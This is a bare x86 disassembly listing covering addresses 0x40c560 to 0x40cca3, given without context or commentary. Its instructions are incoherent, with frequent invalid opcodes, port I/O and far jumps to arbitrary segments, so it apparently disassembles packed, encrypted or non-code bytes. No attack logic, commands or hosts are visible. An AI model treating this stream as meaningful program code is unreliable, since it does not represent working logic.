  40c560:	retf   0x2be3
  40c563:	retf   
  40c564:	push   edi
  40c565:	jb     0x40c548
  40c567:	cli    
  40c568:	out    0x18,al
  40c56a:	popf   
  40c56b:	pop    es
  40c56c:	dec    ebp
  40c56d:	inc    edi
  40c56e:	pop    ecx
  40c56f:	les    edi,FWORD PTR [edi+0x4ca6067c]
  40c575:	outs   dx,BYTE PTR ds:[esi]
  40c576:	jbe    0x40c586
  40c578:	ins    DWORD PTR es:[edi],dx
  40c579:	jne    0x40c591
  40c57b:	push   ds
  40c57c:	inc    edx
  40c57d:	mov    bl,0xad
  40c57f:	enter  0x8bfe,0x3d
  40c583:	mov    ch,dl
  40c585:	mov    ch,0xfa
  40c587:	icebp  
  40c588:	es out 0x90,al
  40c58b:	or     eax,0x71848347
  40c590:	cwde   
  40c591:	out    0xb2,al
  40c593:	mov    eax,0x4bff2400
  40c598:	inc    ebp
  40c599:	aad    0xb8
  40c59b:	add    DWORD PTR [eax+0x5a],ecx
  40c59e:	(bad)
  40c5a2:	bound  ecx,QWORD PTR [ebx-0x459dfa50]
  40c5a8:	mov    ds:0xaa70529,eax
  40c5ad:	ins    BYTE PTR es:[edi],dx
  40c5ae:	aam    0x9c
  40c5b0:	and    eax,0xd8c1808
  40c5b5:	hlt    
  40c5b6:	mov    ds:0x852c539,eax
  40c5bb:	scas   al,BYTE PTR es:[edi]
  40c5bc:	fs repnz pop ebx
  40c5bf:	mov    BYTE PTR [ebp-0x18],bl
  40c5c2:	jno    0x40c57c
  40c5c4:	push   ebp
  40c5c5:	mov    al,0x85
  40c5c7:	retf   0x353b
  40c5ca:	in     al,dx
  40c5cb:	jmp    0x40c57f
  40c5cd:	jmp    DWORD PTR ss:[eax]
  40c5d0:	inc    edx
  40c5d1:	pop    ebp
  40c5d2:	inc    edi
  40c5d3:	(bad)  
  40c5d4:	scas   al,BYTE PTR es:[edi]
  40c5d5:	aam    0xff
  40c5d7:	xchg   edi,eax
  40c5d8:	fdivr  QWORD PTR [esi+ecx*1+0x2b]
  40c5dc:	mov    eax,ds
  40c5de:	test   al,0xca
  40c5e0:	retf   0x19c8
  40c5e3:	pusha  
  40c5e4:	xor    BYTE PTR [edx-0x34],bh
  40c5e7:	dec    ebp
  40c5e8:	xlat   BYTE PTR ds:[ebx]
  40c5e9:	ins    BYTE PTR es:[edi],dx
  40c5ea:	sar    ecx,cl
  40c5ec:	jmp    0xe78369fe
  40c5f1:	pop    edx
  40c5f2:	fs xchg edx,eax
  40c5f4:	jge    0x40c58a
  40c5f6:	ror    BYTE PTR [ebx],0x2a
  40c5f9:	cmp    DWORD PTR [ebp-0x62ff1171],edi
  40c5ff:	mov    eax,0x275d744d
  40c604:	loopne 0x40c5f5
  40c606:	leave  
  40c607:	mov    WORD PTR [ebp+0x706e7e9f],?
  40c60d:	push   ss
  40c60e:	mov    eax,ds:0x87500c05
  40c613:	ret    
  40c614:	cmp    al,0x51
  40c616:	pop    ebx
  40c617:	add    al,0x59
  40c619:	std    
  40c61a:	jo     0x40c632
  40c61c:	pop    eax
  40c61d:	xlat   BYTE PTR ds:[ebx]
  40c61e:	mov    ebp,0xc04ec774
  40c623:	std    
  40c624:	adc    al,0xe2
  40c626:	jnp    0x40c624
  40c628:	dec    ecx
  40c629:	(bad)  [eax-0x46]
  40c62c:	enter  0x777e,0xb6
  40c630:	push   eax
  40c631:	sub    edi,DWORD PTR [edi+0x7a]
  40c634:	cmp    ebx,DWORD PTR [edx-0x37b38281]
  40c63a:	mov    WORD PTR [edx+0x54193439],ss
  40c640:	outs   dx,DWORD PTR ds:[esi]
  40c641:	xchg   ecx,eax
  40c642:	push   ebx
  40c643:	pop    esp
  40c644:	add    cl,BYTE PTR [eax]
  40c646:	call   0x59c6:0xd3931598
  40c64d:	and    edx,DWORD PTR [eax-0x66f5b880]
  40c653:	mov    DWORD PTR [ecx-0x289398ef],ecx
  40c659:	adc    bh,BYTE PTR [ecx-0x21]
  40c65c:	jns    0x40c66c
  40c65e:	sbb    dh,BYTE PTR [esi+0x5a85834a]
  40c664:	ins    DWORD PTR es:[edi],dx
  40c665:	xchg   edi,eax
  40c666:	cmp    edx,DWORD PTR [edx]
  40c668:	sbb    bl,bl
  40c66a:	comiss xmm0,DWORD PTR [esi-0x253a608e]
  40c671:	fnstenv [ecx+0x11]
  40c674:	sub    al,0x4a
  40c676:	mov    eax,ds:0x2d8813d3
  40c67b:	clc    
  40c67c:	push   ebx
  40c67d:	xchg   esi,eax
  40c67e:	out    0x7c,al
  40c680:	mov    ds:0x422a095c,eax
  40c685:	jbe    0x40c60a
  40c687:	(bad)  
  40c688:	int3   
  40c689:	add    BYTE PTR [edi-0x57],al
  40c68c:	gs sub eax,0x87e17c0d
  40c692:	dec    esi
  40c693:	aam    0xfa
  40c695:	outs   dx,BYTE PTR ds:[esi]
  40c696:	and    BYTE PTR [edi],cl
  40c698:	or     ebp,ecx
  40c69a:	pop    es
  40c69b:	fidivr DWORD PTR [esi+edx*1+0x34dd5f93]
  40c6a2:	cwde   
  40c6a3:	mov    bh,0x74
  40c6a5:	jecxz  0x40c68e
  40c6a7:	mov    al,0x62
  40c6a9:	sbb    esp,DWORD PTR [esp+esi*2+0x34]
  40c6ad:	in     al,0x6b
  40c6af:	das    
  40c6b0:	retf   0x9855
  40c6b3:	rcr    BYTE PTR [ecx],cl
  40c6b5:	mov    ah,0x18
  40c6b7:	test   eax,0x96efd5a
  40c6bc:	cmp    ecx,DWORD PTR [esi+0x17]
  40c6bf:	mov    WORD PTR [ecx-0x5a],fs
  40c6c2:	mov    ebp,0x951cb19f
  40c6c7:	aaa    
  40c6c8:	jmp    0x40c6a9
  40c6ca:	cmp    eax,0x55dcf89b
  40c6cf:	das    
  40c6d0:	jmp    0x40c68b
  40c6d2:	loop   0x40c6f6
  40c6d4:	mov    BYTE PTR [edi],ah
  40c6d6:	jno    0x40c666
  40c6d8:	adc    edx,DWORD PTR [edi+0x32a215af]
  40c6de:	add    DWORD PTR [ebx+0x7d1d19ec],ecx
  40c6e4:	mov    bl,0x22
  40c6e6:	add    DWORD PTR [eax-0x5f2948f3],esp
  40c6ec:	adc    BYTE PTR [ebp-0x7e],dh
  40c6ef:	fcom   DWORD PTR [esi-0x34]
  40c6f2:	ret    0xf219
  40c6f5:	jb     0x40c6db
  40c6f7:	std    
  40c6f8:	ins    BYTE PTR es:[edi],dx
  40c6f9:	adc    al,0xc
  40c6fb:	push   ebx
  40c6fc:	out    0xd4,al
  40c6fe:	lds    esi,FWORD PTR [edx+0x31]
  40c701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c702:	ror    bh,cl
  40c704:	push   ecx
  40c705:	(bad)  
  40c706:	pop    esp
  40c707:	jmp    0x4c5ef3dc
  40c70c:	mov    esp,0xb7b62557
  40c711:	dec    ebx
  40c712:	add    DWORD PTR [edi+0x28],0xffffffbc
  40c716:	push   0xffffffa7
  40c718:	jp     0x40c71c
  40c71a:	pop    ss
  40c71b:	popf   
  40c71c:	(bad)
  40c71f:	enter  0xb1f7,0xf3
  40c723:	xchg   ecx,eax
  40c724:	xchg   ebx,eax
  40c725:	out    dx,eax
  40c726:	fucomip st,st(0)
  40c728:	sbb    eax,0xbd1ecde3
  40c72d:	shl    DWORD PTR [eax-0x6e],0xc
  40c731:	test   al,0x1e
  40c733:	mov    ecx,0xe9922df9
  40c738:	mov    ds,WORD PTR [eax]
  40c73a:	stc    
  40c73b:	es aam 0x2
  40c73e:	daa    
  40c73f:	mov    ah,0x2c
  40c741:	das    
  40c742:	leave  
  40c743:	enter  0x550b,0xbd
  40c747:	xor    BYTE PTR [ebx+0x2f8a2426],dh
  40c74d:	mov    edx,ss
  40c74f:	push   cs
  40c750:	inc    esi
  40c751:	(bad)  
  40c752:	ja     0x40c747
  40c754:	shr    esp,cl
  40c756:	sub    ah,BYTE PTR ds:0xa349d622
  40c75c:	jp     0x40c7da
  40c75e:	xor    al,0xe1
  40c760:	pop    ss
  40c761:	sub    DWORD PTR cs:[esi],eax
  40c764:	mov    cs,WORD PTR [edi]
  40c766:	xchg   DWORD PTR [edx-0x39],ebp
  40c769:	jmp    0xc92c:0x91b0e292
  40c770:	pop    ds
  40c771:	repz jmp 0x40c70f
  40c774:	add    dh,BYTE PTR [ebx+eiz*1+0xf88c6c4]
  40c77b:	add    al,BYTE PTR [esi+0x2e]
  40c77e:	outs   dx,BYTE PTR ds:[esi]
  40c77f:	clc    
  40c780:	sub    eax,0x165a7ce
  40c785:	adc    al,BYTE PTR [esp+ebx*2-0x36]
  40c789:	sbb    cl,BYTE PTR [eax]
  40c78b:	push   ebx
  40c78c:	fld    QWORD PTR [ecx-0x7a]
  40c78f:	jl     0x40c72d
  40c791:	aas    
  40c792:	ret    
  40c793:	ffreep st(1)
  40c795:	aas    
  40c796:	je     0x40c719
  40c798:	mov    dl,0xae
  40c79a:	sahf   
  40c79b:	(bad)  
  40c79c:	mov    bp,0x441b
  40c7a0:	test   eax,0xc2518f9a
  40c7a5:	xor    ecx,DWORD PTR [eax+edx*1+0x54]
  40c7a9:	mov    edx,0x865bb692
  40c7ae:	jns    0x40c750
  40c7b0:	inc    ecx
  40c7b1:	dec    esp
  40c7b2:	adc    al,0xf3
  40c7b4:	stc    
  40c7b5:	jp     0x40c7b5
  40c7b7:	sub    BYTE PTR [ebp-0x776c74e5],0x87
  40c7be:	lock call 0xfe6caccb
  40c7c4:	mov    ds:0x7aa3a5d,al
  40c7c9:	mov    ds:0xbea95ae1,al
  40c7ce:	nop
  40c7cf:	stos   DWORD PTR es:[edi],eax
  40c7d0:	cli    
  40c7d1:	jnp    0x40c80b
  40c7d3:	sbb    al,0x4b
  40c7d5:	call   0x76422109
  40c7da:	jno    0x40c82e
  40c7dc:	(bad)  
  40c7dd:	loop   0x40c761
  40c7df:	fdivp  st(7),st
  40c7e1:	(bad)  
  40c7e2:	stc    
  40c7e3:	jbe    0x40c792
  40c7e5:	(bad)  
  40c7e6:	cmp    BYTE PTR [edi],dl
  40c7e8:	cmp    ebx,DWORD PTR [edx+0x53031244]
  40c7ee:	inc    eax
  40c7ef:	xchg   esi,eax
  40c7f0:	loop   0x40c83d
  40c7f2:	mov    ah,BYTE PTR [edx+esi*4]
  40c7f5:	inc    edi
  40c7f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7f7:	dec    esp
  40c7f8:	(bad)  
  40c7f9:	mov    edi,0xfe86722
  40c7fe:	jb     0x40c7fa
  40c800:	les    esi,FWORD PTR [eax]
  40c802:	(bad)  
  40c803:	es jmp 0x1f63:0x7195ba5f
  40c80b:	push   ebp
  40c80c:	dec    edi
  40c80d:	mov    WORD PTR [ecx],fs
  40c80f:	les    eax,FWORD PTR [ebx+0x4d]
  40c812:	jecxz  0x40c795
  40c814:	xchg   ecx,ebx
  40c816:	add    esi,esi
  40c818:	sbb    al,0xbe
  40c81a:	in     eax,0xa8
  40c81c:	out    dx,eax
  40c81d:	test   eax,0x259217cc
  40c822:	xlat   BYTE PTR ds:[ebx]
  40c823:	jecxz  0x40c807
  40c825:	push   ecx
  40c826:	pop    ecx
  40c827:	jnp    0x40c87b
  40c829:	rcr    DWORD PTR [edi+edi*1],1
  40c82c:	add    BYTE PTR [ebx],bh
  40c82e:	ja     0x40c808
  40c830:	xor    eax,eax
  40c832:	fsubr  DWORD PTR [ebx]
  40c834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c835:	aas    
  40c836:	test   BYTE PTR [edx+0x612d767d],dh
  40c83c:	dec    eax
  40c83d:	push   ebp
  40c83e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c83f:	(bad)  
  40c841:	and    BYTE PTR [esi+0xc],ah
  40c844:	inc    edi
  40c845:	jmp    0x40c869
  40c847:	test   BYTE PTR [esi],bl
  40c849:	inc    edx
  40c84a:	imul   edi,DWORD PTR [edx+0x39],0x4cfc489d
  40c851:	sub    DWORD PTR [eax+ebx*2],ebx
  40c854:	test   eax,0x5f551ad6
  40c859:	sbb    ebp,edi
  40c85b:	mov    ebx,0x3d8b3e74
  40c860:	or     DWORD PTR [edx+0xa0fed3],ecx
  40c866:	push   ss
  40c867:	int3   
  40c868:	sbb    al,cl
  40c86a:	test   ch,bh
  40c86c:	push   ds
  40c86d:	jmp    0x40c844
  40c86f:	inc    ebx
  40c870:	dec    edx
  40c871:	mov    edx,edi
  40c873:	sub    edi,esp
  40c875:	xor    DWORD PTR ds:0x670b5a0,0x71
  40c87c:	lock in eax,dx
  40c87e:	mov    ecx,0xd7cb2853
  40c883:	mov    ah,0x87
  40c885:	push   ss
  40c886:	ins    DWORD PTR es:[edi],dx
  40c887:	cs cmp ebx,esi
  40c88a:	push   eax
  40c88b:	and    eax,0xdeedba53
  40c890:	xor    ebx,esp
  40c892:	mov    bl,0x28
  40c894:	mov    ds:0xeea12c84,eax
  40c899:	aad    0x1f
  40c89b:	ja     0x40c88c
  40c89d:	lahf   
  40c89e:	pushf  
  40c89f:	pop    ecx
  40c8a0:	jge    0x40c91f
  40c8a2:	sahf   
  40c8a3:	pusha  
  40c8a4:	jo     0x40c8a4
  40c8a6:	leavew 
  40c8a8:	aaa    
  40c8a9:	mov    dl,BYTE PTR [ecx+esi*1+0xd]
  40c8ad:	stos   DWORD PTR es:[edi],eax
  40c8ae:	mov    cl,0x2b
  40c8b0:	xor    DWORD PTR [esi],edx
  40c8b2:	inc    esi
  40c8b3:	jo     0x40c895
  40c8b5:	neg    edi
  40c8b7:	(bad)  
  40c8b8:	mov    ebp,0x4ff66dda
  40c8bd:	pusha  
  40c8be:	mov    al,ds:0xa26d452d
  40c8c3:	imul   esi,DWORD PTR [edx+0x66d3eb85],0xd67a621f
  40c8cd:	adc    al,bl
  40c8cf:	xor    al,0x96
  40c8d1:	in     al,0x2
  40c8d3:	xlat   BYTE PTR ds:[ebx]
  40c8d4:	jmp    0x224a:0x965551e5
  40c8db:	test   eax,0x83cc18dc
  40c8e0:	arpl   WORD PTR [edi],cx
  40c8e2:	jp     0x40c936
  40c8e4:	jno    0x40c8ee
  40c8e6:	mov    cl,BYTE PTR [ebp+0x0]
  40c8e9:	xchg   DWORD PTR [edx+0x27],edx
  40c8ec:	pop    ds
  40c8ed:	jno    0x40c918
  40c8ef:	pop    edi
  40c8f0:	adc    eax,0xc3f3ce08
  40c8f5:	aaa    
  40c8f6:	adc    dl,BYTE PTR [ebp+0x28bb44b7]
  40c8fc:	adc    al,0xac
  40c8fe:	daa    
  40c8ff:	sub    eax,DWORD PTR [ebp+0x176dab4]
  40c905:	lahf   
  40c906:	xor    DWORD PTR [ecx],esi
  40c908:	retf   
  40c909:	and    al,0x6c
  40c90b:	les    ebp,FWORD PTR [eax]
  40c90d:	mov    eax,ds:0x992fe0cd
  40c912:	in     eax,0x49
  40c914:	push   es
  40c915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c916:	mov    es,WORD PTR [eax+0x6c2076f8]
  40c91c:	jbe    0x40c919
  40c91e:	loop   0x40c935
  40c920:	mov    ebx,0x195bd852
  40c925:	mov    dl,0x35
  40c927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c928:	lahf   
  40c929:	mov    cl,0x20
  40c92b:	or     eax,0xebb16c56
  40c930:	dec    eax
  40c931:	shr    bl,1
  40c933:	sub    al,0x86
  40c935:	mov    ebp,0x9f86002e
  40c93a:	push   es
  40c93b:	shl    DWORD PTR [ecx],cl
  40c93d:	or     BYTE PTR [ebp+0x1ff03873],bl
  40c943:	ins    DWORD PTR es:[edi],dx
  40c944:	in     eax,dx
  40c945:	popa   
  40c946:	jb     0x40c967
  40c948:	adc    BYTE PTR [ebp+0x30be72e5],ah
  40c94e:	and    dl,ch
  40c950:	xor    al,0x1c
  40c952:	pusha  
  40c953:	pop    esp
  40c954:	aas    
  40c955:	inc    ecx
  40c956:	add    eax,DWORD PTR [esi]
  40c958:	bound  ebx,QWORD PTR [edx+0x2100e8e3]
  40c95e:	pop    esp
  40c95f:	and    eax,0x1ddae3b
  40c964:	dec    ebp
  40c965:	mov    ah,0xe2
  40c967:	pop    ecx
  40c968:	inc    edi
  40c969:	aam    0x85
  40c96b:	(bad)  
  40c96c:	sbb    eax,ebp
  40c96e:	and    esp,DWORD PTR [edi-0x5a]
  40c971:	mov    cl,0x4d
  40c973:	enter  0x8683,0x37
  40c977:	fdivr  QWORD PTR [edi]
  40c979:	add    DWORD PTR [edx+0x69],ebp
  40c97c:	std    
  40c97d:	and    bh,BYTE PTR ds:0x89a448ef
  40c983:	jmp    0x8adb9068
  40c988:	inc    eax
  40c989:	or     BYTE PTR [esi],bl
  40c98b:	into   
  40c98c:	imul   ebp,ecx,0x45c91b01
  40c992:	xor    cl,cl
  40c994:	mov    WORD PTR [eax],ss
  40c996:	xlat   BYTE PTR ds:[ebx]
  40c997:	inc    eax
  40c998:	loopne 0x40c9a6
  40c99a:	dec    ebx
  40c99b:	ret    0x4cdd
  40c99e:	(bad)  
  40c99f:	call   0xcdd4:0x2c77d61c
  40c9a6:	test   eax,0x76131d3b
  40c9ab:	outs   dx,BYTE PTR ds:[esi]
  40c9ac:	stos   DWORD PTR es:[edi],eax
  40c9ad:	dec    edi
  40c9ae:	sti    
  40c9af:	inc    BYTE PTR [edi+0x36]
  40c9b2:	inc    ebp
  40c9b3:	mov    ss,WORD PTR [edx+0x2d3a35c5]
  40c9b9:	retf   
  40c9ba:	pusha  
  40c9bb:	call   0x44f360fe
  40c9c0:	sbb    al,0x4a
  40c9c2:	push   ebp
  40c9c3:	jae    0x40c97f
  40c9c5:	and    DWORD PTR [ecx+0x41aa61e4],esi
  40c9cb:	out    dx,eax
  40c9cc:	pop    ss
  40c9cd:	les    ecx,FWORD PTR [eax]
  40c9cf:	fbstp  TBYTE PTR [esi+0x6f5d742e]
  40c9d5:	and    DWORD PTR [ecx],edx
  40c9d7:	push   ebx
  40c9d8:	call   0x34583e1
  40c9dd:	rcl    BYTE PTR [ebp+eiz*8-0x21698638],cl
  40c9e4:	outs   dx,BYTE PTR ds:[esi]
  40c9e5:	push   ebx
  40c9e6:	push   es
  40c9e7:	int    0x49
  40c9e9:	ds pop esp
  40c9eb:	imul   eax,ecx,0xffffffe5
  40c9ee:	loop   0x40c9a3
  40c9f0:	push   ebx
  40c9f1:	cdq    
  40c9f2:	pop    ecx
  40c9f3:	data16 and BYTE PTR [ebx+esi*2+0x30],0x9a
  40c9f9:	sub    al,dl
  40c9fb:	and    al,0xb7
  40c9fd:	jmp    0x40c9ef
  40c9ff:	and    BYTE PTR [eax+0x3d],ch
  40ca02:	mov    DWORD PTR [ebp+0x5aee774b],ebx
  40ca08:	popa   
  40ca09:	bound  ecx,QWORD PTR [eax+0x10]
  40ca0c:	in     eax,0x3
  40ca0e:	xchg   ecx,eax
  40ca0f:	and    BYTE PTR [ebp-0x3248fcbd],dl
  40ca15:	adc    DWORD PTR [edx-0xb],ebp
  40ca18:	fimul  WORD PTR [edi+ecx*8-0x6561d369]
  40ca1f:	pop    ds
  40ca20:	fisub  WORD PTR [edx+0x32]
  40ca23:	add    DWORD PTR [ecx+0x40c42b2b],ebp
  40ca29:	test   al,0x7d
  40ca2b:	scas   al,BYTE PTR es:[edi]
  40ca2c:	cmp    al,0x67
  40ca2e:	shr    DWORD PTR [ebp+0x50],1
  40ca31:	lds    edi,FWORD PTR [edx+edi*2+0x16d3aa17]
  40ca38:	mov    dl,0x49
  40ca3a:	or     esp,ecx
  40ca3c:	mov    ch,0x7c
  40ca3e:	fwait
  40ca3f:	sbb    eax,0xea1758e
  40ca44:	iret   
  40ca45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca46:	cmp    DWORD PTR [ebx+0x224f2a3b],edi
  40ca4c:	out    dx,al
  40ca4d:	cli    
  40ca4e:	int3   
  40ca4f:	cwde   
  40ca50:	js     0x40ca4e
  40ca52:	jno    0x40ca5e
  40ca54:	jne    0x40cac7
  40ca56:	push   ss
  40ca57:	mov    ecx,fs
  40ca59:	or     ebp,DWORD PTR [ebp-0x31]
  40ca5c:	arpl   WORD PTR [esi+edi*2-0x1f],dx
  40ca60:	jae    0x40ca5a
  40ca62:	iret   
  40ca63:	lds    ebp,FWORD PTR [edi+0x38]
  40ca66:	mov    edx,0xe06595f6
  40ca6b:	push   esi
  40ca6c:	pop    edi
  40ca6d:	stos   BYTE PTR es:[edi],al
  40ca6e:	ds aaa 
  40ca70:	mov    ds:0x52dd5192,eax
  40ca75:	aaa    
  40ca76:	add    BYTE PTR [ecx+0x34],cl
  40ca79:	rcl    BYTE PTR [edi+0x5ea1f7e2],1
  40ca7f:	iret   
  40ca80:	xchg   esp,eax
  40ca81:	adc    BYTE PTR [edi-0x438df93a],dl
  40ca87:	adc    DWORD PTR [edi-0x55d12d9a],ebp
  40ca8d:	lahf   
  40ca8e:	imul   esi,DWORD PTR [ebx],0x1bc27ff7
  40ca94:	inc    edx
  40ca95:	ss add al,0xce
  40ca98:	lock fcmovb st,st(7)
  40ca9b:	sbb    cl,bh
  40ca9d:	mov    al,0x3a
  40ca9f:	sub    DWORD PTR [ebp-0x293c75b9],ebx
  40caa5:	mov    eax,0xe8beed1
  40caaa:	sbb    eax,DWORD PTR [ecx-0x2272c8da]
  40cab0:	adc    edi,DWORD PTR [edx]
  40cab2:	imul   edx,DWORD PTR [esi+0x3d],0xffffff80
  40cab6:	push   ecx
  40cab7:	js     0x40ca57
  40cab9:	jge    0x40caed
  40cabb:	(bad)  [edx]
  40cabd:	addr16 inc ebp
  40cabf:	fptan  
  40cac1:	lods   al,BYTE PTR ds:[esi]
  40cac2:	pop    ds
  40cac3:	lahf   
  40cac4:	or     DWORD PTR [edx-0x4627cdfc],edx
  40caca:	adc    BYTE PTR [esi],0x38
  40cacd:	sub    cl,cl
  40cacf:	(bad)  
  40cad0:	sar    BYTE PTR fs:0xbff480b2,0x54
  40cad8:	lahf   
  40cad9:	in     eax,0xc9
  40cadb:	cmp    dl,dh
  40cadd:	pop    ss
  40cade:	jl     0x40ca96
  40cae0:	or     cl,BYTE PTR fs:[ebx]
  40cae3:	pop    edx
  40cae4:	leave  
  40cae5:	push   ebx
  40cae6:	ins    BYTE PTR es:[edi],dx
  40cae7:	mov    ah,0x1d
  40cae9:	cmc    
  40caea:	inc    ebx
  40caeb:	mov    ds:0xe3d72dfa,eax
  40caf0:	ret    0xb83
  40caf3:	xlat   BYTE PTR ds:[ebx]
  40caf4:	cmc    
  40caf5:	nop
  40caf6:	and    BYTE PTR [eax-0x4f],0x91
  40cafa:	cmp    eax,edx
  40cafc:	dec    edx
  40cafd:	dec    ebp
  40cafe:	sub    eax,0xffa2a385
  40cb03:	inc    ebx
  40cb04:	stos   DWORD PTR es:[edi],eax
  40cb05:	mov    cl,0x67
  40cb07:	xchg   edx,eax
  40cb08:	or     al,0x80
  40cb0a:	mov    eax,0x3e684452
  40cb0f:	dec    esp
  40cb10:	inc    eax
  40cb11:	shr    DWORD PTR [esi+0x74],1
  40cb14:	stos   DWORD PTR es:[edi],eax
  40cb15:	leave  
  40cb16:	outs   dx,BYTE PTR ds:[esi]
  40cb17:	test   DWORD PTR [edi-0x65],edi
  40cb1a:	sbb    al,0x7b
  40cb1c:	call   0x38ef9dbf
  40cb21:	mov    bl,0x6c
  40cb23:	mov    dh,0xf5
  40cb25:	inc    esi
  40cb26:	and    bh,BYTE PTR [ecx-0x2]
  40cb29:	scas   al,BYTE PTR es:[edi]
  40cb2a:	ins    DWORD PTR es:[edi],dx
  40cb2b:	jecxz  0x40cae0
  40cb2d:	push   esp
  40cb2e:	dec    ebp
  40cb2f:	or     eax,0xf34536be
  40cb34:	je     0x40cb62
  40cb36:	mov    eax,ds:0x70691e05
  40cb3b:	push   edx
  40cb3c:	lahf   
  40cb3d:	jmp    0xa6e7cd9f
  40cb42:	mov    al,ds:0x9e12e1fa
  40cb47:	ror    al,cl
  40cb49:	dec    ecx
  40cb4a:	repnz aaa 
  40cb4c:	repnz sub al,0x12
  40cb4f:	gs clc 
  40cb51:	jp     0x40cb7e
  40cb53:	jecxz  0x40cb03
  40cb55:	lds    edi,FWORD PTR [ebx-0x66]
  40cb58:	sbb    al,0x8
  40cb5a:	jmp    0x40cb1d
  40cb5c:	mov    al,0x4c
  40cb5e:	fwait
  40cb5f:	adc    DWORD PTR [eax],ebp
  40cb61:	das    
  40cb62:	pop    ebx
  40cb63:	sub    BYTE PTR [esp+edx*1],dl
  40cb66:	scas   al,BYTE PTR es:[edi]
  40cb67:	fisub  DWORD PTR [ebx+0x75b837a]
  40cb6d:	dec    ecx
  40cb6e:	sbb    ebx,DWORD PTR [eax+0x73]
  40cb71:	jle    0x40cb65
  40cb73:	ins    BYTE PTR es:[edi],dx
  40cb74:	(bad)  
  40cb75:	std    
  40cb76:	and    cl,dh
  40cb78:	xchg   edi,eax
  40cb79:	add    edi,DWORD PTR [ebx+0x10]
  40cb7c:	aam    0x6d
  40cb7e:	mov    ds:0x46f46c06,eax
  40cb83:	jns    0x40cb1f
  40cb85:	daa    
  40cb86:	sbb    al,0x6a
  40cb88:	and    BYTE PTR ds:0xc116c785,ah
  40cb8e:	xor    eax,0x8c086bde
  40cb93:	pop    esp
  40cb94:	xor    ah,dh
  40cb96:	stos   DWORD PTR es:[edi],eax
  40cb97:	xor    eax,0xcef68384
  40cb9c:	retf   0xf525
  40cb9f:	retf   
  40cba0:	inc    ebp
  40cba1:	ficom  DWORD PTR [eiz*2+0x5b622678]
  40cba8:	aam    0xc8
  40cbaa:	mov    ebp,DWORD PTR [eax-0x40eacb91]
  40cbb0:	mov    bl,0x98
  40cbb2:	push   ecx
  40cbb3:	sub    BYTE PTR [edx+0xe40c672],dh
  40cbb9:	in     al,dx
  40cbba:	pop    es
  40cbbb:	and    al,0x15
  40cbbd:	clc    
  40cbbe:	pop    edi
  40cbbf:	inc    edi
  40cbc0:	aaa    
  40cbc1:	outs   dx,BYTE PTR ds:[esi]
  40cbc2:	mov    eax,0x75846b64
  40cbc7:	das    
  40cbc8:	imul   esp,DWORD PTR [edx+0x56],0x7a
  40cbcc:	loop   0x40cbc5
  40cbce:	loope  0x40cc2e
  40cbd0:	mov    dh,BYTE PTR ds:0xa915185
  40cbd6:	jecxz  0x40cbcd
  40cbd8:	cs js  0x40cb6f
  40cbdb:	je     0x40cc27
  40cbdd:	mov    ah,dh
  40cbdf:	xchg   ecx,eax
  40cbe0:	outs   dx,DWORD PTR ds:[esi]
  40cbe1:	sub    al,0x7a
  40cbe3:	es test eax,0x1e9922b2
  40cbe9:	jp     0x40cba0
  40cbeb:	add    edi,esp
  40cbed:	test   BYTE PTR [ecx-0x17],ch
  40cbf0:	dec    esp
  40cbf1:	cdq    
  40cbf2:	adc    edx,DWORD PTR [esp+edx*1]
  40cbf5:	push   0xcd43f77c
  40cbfa:	mov    esi,0x17bb789e
  40cbff:	xchg   edi,eax
  40cc00:	xlat   BYTE PTR ds:[ebx]
  40cc01:	std    
  40cc02:	xchg   ch,bl
  40cc04:	adc    bh,BYTE PTR [ecx-0x32]
  40cc07:	cmp    DWORD PTR [ebx-0x25],ecx
  40cc0a:	dec    edi
  40cc0b:	inc    edi
  40cc0c:	mov    DWORD PTR [ebp-0xa76522d],esp
  40cc12:	popa   
  40cc13:	adc    eax,0xb720c261
  40cc18:	gs mov esp,0xe6dd9c64
  40cc1e:	jnp    0x40cbc2
  40cc20:	and    al,0x99
  40cc22:	jecxz  0x40cc58
  40cc24:	shl    BYTE PTR [ecx+0x27e5c8c5],0x2e
  40cc2b:	mov    gs,WORD PTR [ecx+0x65]
  40cc2e:	add    eax,0x1efeed6d
  40cc33:	jns    0x40cbcc
  40cc35:	cmp    bl,ah
  40cc37:	(bad)  
  40cc38:	mov    cl,0xbc
  40cc3a:	stos   DWORD PTR es:[edi],eax
  40cc3b:	lods   eax,DWORD PTR ds:[esi]
  40cc3c:	sub    BYTE PTR [ecx+0x32e82764],ah
  40cc42:	pop    DWORD PTR [eax]
  40cc44:	inc    esi
  40cc45:	xor    BYTE PTR [esi-0x73339dc3],bh
  40cc4b:	shl    ah,cl
  40cc4d:	pop    edx
  40cc4e:	ret    
  40cc4f:	inc    ebx
  40cc50:	cld    
  40cc51:	inc    edi
  40cc52:	jle    0x40ccb9
  40cc54:	mov    ds:0x7297ecf4,al
  40cc59:	sbb    esp,ebp
  40cc5b:	mov    DWORD PTR [ebp-0x3b738bbe],edx
  40cc61:	pop    ss
  40cc62:	push   eax
  40cc63:	outs   dx,DWORD PTR ds:[esi]
  40cc64:	out    dx,al
  40cc65:	lds    edi,FWORD PTR [edx+0x6b]
  40cc68:	mov    al,bh
  40cc6a:	pop    ds
  40cc6b:	int3   
  40cc6c:	in     al,dx
  40cc6d:	jmp    0x6071:0x9ecd0b4e
  40cc74:	in     eax,0x58
  40cc76:	push   0xfffffffc
  40cc78:	inc    edi
  40cc79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc7a:	push   ebp
  40cc7b:	leave  
  40cc7c:	pop    ebp
  40cc7d:	push   ecx
  40cc7e:	in     al,0xfd
  40cc80:	fcomp  st(1)
  40cc82:	idiv   DWORD PTR [ebx]
  40cc84:	leave  
  40cc85:	es sahf 
  40cc87:	cmp    al,0x59
  40cc89:	sub    al,0x40
  40cc8b:	lock fnstcw WORD PTR [ebx-0x12eb03e]
  40cc92:	data16 mov cl,0xc7
  40cc95:	shl    DWORD PTR [edx+0x48a7979],cl
  40cc9b:	add    edx,DWORD PTR [eax-0x4e]
  40cc9e:	(bad)  
  40cc9f:	adc    DWORD PTR [edx+esi*8],ebx
  40cca2:	iret   
  40cca3:	mov    eax,0xb7f59fc2
